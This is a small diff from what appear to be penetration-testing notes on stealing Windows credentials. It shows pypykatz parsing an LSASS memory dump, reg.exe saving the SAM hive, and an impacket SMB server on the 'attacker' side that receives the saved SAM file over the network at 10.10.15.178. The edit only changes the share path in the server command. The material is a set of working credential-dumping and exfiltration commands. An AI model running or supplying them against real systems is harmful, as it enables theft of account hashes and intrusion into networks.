@@ -57,7 +57,7 @@ pypykatz lsa minidump /path/to/lsassdumpfile
 reg.exe save hklm\sam C:\sam.save
 move sam.save \\<ip>\NameofFileShare
 ---
-attacker: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+attacker: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData "$(pwd)"
 
 win machine:
 reg save HKLM\SAM \\10.10.15.178\CompData\sam.save
